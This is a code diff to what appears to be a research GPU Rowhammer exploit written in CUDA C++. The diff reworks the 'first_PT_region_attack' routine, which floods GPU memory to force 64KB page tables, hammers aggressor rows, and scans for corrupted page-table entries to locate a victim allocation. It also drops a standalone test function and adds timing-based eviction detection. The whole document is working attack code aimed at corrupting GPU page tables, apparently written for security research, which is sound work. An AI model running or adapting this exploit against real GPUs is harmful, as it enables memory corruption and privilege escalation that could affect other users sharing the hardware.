@@ -13,65 +13,8 @@
 #include <random>
 #include <cmath>
 
-void
-first_PT_region_attack_test (int argc, char *argv[])
-{
-  const uint64_t num_alloc_init = std::stoll (argv[0]);
-  const double threshold = std::stod (argv[1]);
-  const uint64_t skip = std::stoull (argv[2]);
-
-  uint8_t *temp;
-  GPUBreachContext ctx;
-  ctx.bitflip_config = GPUBreachContext::BitFlipConfig(argv[3]);
-  if (!first_PT_region (num_alloc_init, threshold, skip, ctx))
-    {
-      printf ("Error: First PT Region Allocation is wrong\n");
-      exit (1);
-    }
-
-  std::cout << std::dec;
-  std::cout
-      << "Test Step 3:" << "\n"
-      << "Filling Memory to Full Again"
-      << "\n\n";
-
-  int consec_spike = 0;
-  int consec_spike_lim = 5;
-  for (uint64_t i = 0; i < 47L * 1024 * 1024 * 1024; i += 1)
-    {
-      cudaMallocManaged (&temp, ALLOC_SIZE);
-      double currentMS = time_data_access (temp, ALLOC_SIZE);
-      DBG_OUT << i << " New PT time: " << currentMS << ' ' << (void *)temp
-              << " ms" << std::endl;
-
-      // Create 64KB Pages to increase chances.
-      *temp = 'a';
-
-      if (i < skip)
-        continue;
-
-      // Look for consecutive spikes, reset if not.
-      consec_spike += currentMS > threshold ? 1 : -consec_spike;
-      if (consec_spike == consec_spike_lim)
-        {
-          std::cout << "Spikes observed after allocation index \033[1;31m"
-                    << i - consec_spike_lim + 1
-                    << "\033[0m" << std::endl;
-          std::cout << "This means you should perform at most \033[1m"
-                    << i - consec_spike_lim + 1
-                    << "\033[0m number of allocations to avoid eviction"
-                    << std::endl;
-          std::cout << "Pass \033[1;32m"
-                    << i - consec_spike_lim + 1
-                    << "\033[0m as the limit in subsequent experiments."
-                    << std::endl;
-          break;
-        }
-    }
-}
-
 bool
-first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, double threshold,
+first_PT_region_attack (uint64_t num_alloc_init, double threshold,
                         uint64_t skip, GPUBreachContext& ctx)
 {
   uint8_t *temp;
@@ -98,7 +41,12 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
   auto& victim_ptr = ctx.step3_data.victim_ptr;
   auto& corrupted_id = ctx.step3_data.corrupted_id;
   auto& victim_id = ctx.step3_data.victim_id;
-  region_ptrs = std::vector<uint8_t *> (num_alloc_post_msg);
+
+  
+  region_ptrs = std::vector<uint8_t *> (num_alloc_init, nullptr);
+
+  /* Why -200: We don't want eviction to happen when we hammer so we take a slight estimate */
+  uint64_t conservative_alloc = num_alloc_init - 200;
 
   /**
    * WARNING: this code is aggresively making all 2MB to 64KB page tables,
@@ -116,10 +64,9 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
     {
       // On Failure, Re-order and try again
       if (repeats != 0)
-        std::rotate (region_ptrs.begin(), region_ptrs.begin() + num_alloc_post_msg - 32,
-                     region_ptrs.begin() + num_alloc_post_msg);
-        // std::shuffle(region_ptrs, region_ptrs + num_alloc_post_msg, g);
-      for (uint64_t i = 0; i < 8000; i += 1)
+        std::rotate (region_ptrs.begin(), region_ptrs.begin() + 8000-2,
+                     region_ptrs.begin() + 8000-1);
+      for (uint64_t i = 0; i < (repeats != 0 ? 8000 : conservative_alloc); i += 1)
         {
           if (repeats != 0)
             cudaFree (region_ptrs[i]);
@@ -130,12 +77,9 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
 
           region_ptrs[i] = temp;
 
-          // if (repeats != 0 && i < 8000)
           if (i < 8000)
             *region_ptrs[i] = 'a';
         }
-      paused();
-      std::cout << "donr" << '\n';
       gpuErrchk (cudaPeekAtLastError ());
       std::cout << "First PT Region Filled " << "Round " << repeats
                 << " Completed" << '\n';
@@ -159,7 +103,6 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
             agg_row_list, agg_vec, it, n, k, agg_vec.size (), delay, period);
 
       std::cout << "Hammer Done, Finding Corruption... \033[1;31m(Rare: If taking longer than 5s, CTRL + C and stop the program)\033[0m" << '\n';
-      paused();
       /**
        * For each 64KB, read from cuda. (Change util to write different data to
        * 64KB offset) Find repetition for temp and pair.
@@ -167,7 +110,7 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
        * If not repetition, find if it matches a PTE.
        */ 
       gpuErrchk (cudaPeekAtLastError ());
-      for (uint64_t i = 0; !found_mismatch && i < num_alloc_post_msg; i++)
+      for (uint64_t i = 0; !found_mismatch && i < conservative_alloc; i++)
       {
           // Pre-initialize result slots in existing region memory
           uint64_t sentinel = UINT64_MAX;
@@ -213,7 +156,7 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
 
   uint8_t *victim_round_addr
       = (uint8_t *)((uintptr_t)victim_ptr & ~((1UL << 20) - 1));
-  for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
+  for (uint64_t i = 0; i < conservative_alloc; i += 1)
     {
       if (region_ptrs[i] == victim_round_addr)
         {
@@ -232,6 +175,24 @@ first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, do
   {
     std::cout << "(Step 3 Done) Found Corrupted PFN Destination\n";
   }
+
+  int consec_spike = 0;
+  int consec_spike_lim = 3;
+  for (uint64_t i = conservative_alloc; i < num_alloc_init; i++)
+    {
+      cudaMallocManaged (&temp, ALLOC_SIZE);
+      double currentMS = time_data_access (temp, ALLOC_SIZE);
+      DBG_OUT << i << " New PT time: " << currentMS << ' ' << (void *)temp
+                  << " ms" << std::endl;
+      region_ptrs[i] = temp;
+
+      // Look for consecutive spikes, reset if not.
+      consec_spike += currentMS > threshold ? 1 : -consec_spike;
+      if (consec_spike == consec_spike_lim)
+        {
+          break;
+        }
+    }
   
 
   return true;
@@ -241,11 +202,10 @@ bool
 first_PT_region_attack (int argc, char *argv[])
 {
   const uint64_t num_alloc_init = std::stoll (argv[0]);
-  const uint64_t num_alloc_post_msg = std::stoll (argv[1]);
-  const double threshold = std::stod (argv[2]);
-  const uint64_t skip = std::stoull (argv[3]);
+  const double threshold = std::stod (argv[1]);
+  const uint64_t skip = std::stoull (argv[2]);
   GPUBreachContext ctx;
-  ctx.bitflip_config = GPUBreachContext::BitFlipConfig(argv[4]);
+  ctx.bitflip_config = GPUBreachContext::BitFlipConfig(argv[3]);
   return first_PT_region_attack (
-      num_alloc_init, num_alloc_post_msg, threshold, skip, ctx);
+      num_alloc_init, threshold, skip, ctx);
 }
